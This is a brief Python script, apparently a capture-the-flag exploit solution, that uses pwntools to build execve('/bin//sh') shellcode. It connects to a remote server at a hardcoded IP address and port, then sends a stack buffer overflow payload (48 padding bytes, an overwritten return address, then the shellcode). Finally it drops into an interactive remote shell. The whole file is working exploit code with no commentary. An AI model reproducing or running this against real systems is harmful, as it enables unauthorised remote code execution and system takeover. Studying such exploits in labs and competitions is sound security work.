import pwn


shellcode = pwn.asm("""\
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push eax
mov edx, esp
push ebx
mov ecx, esp
mov al, 11
int 0x80
""")
print(shellcode)

conn = pwn.remote("44.197.231.105", 3002)
print(conn.recvline())
conn.send(b"A"*48 + b"\x16\x92\x04\x08" + shellcode)
conn.interactive()
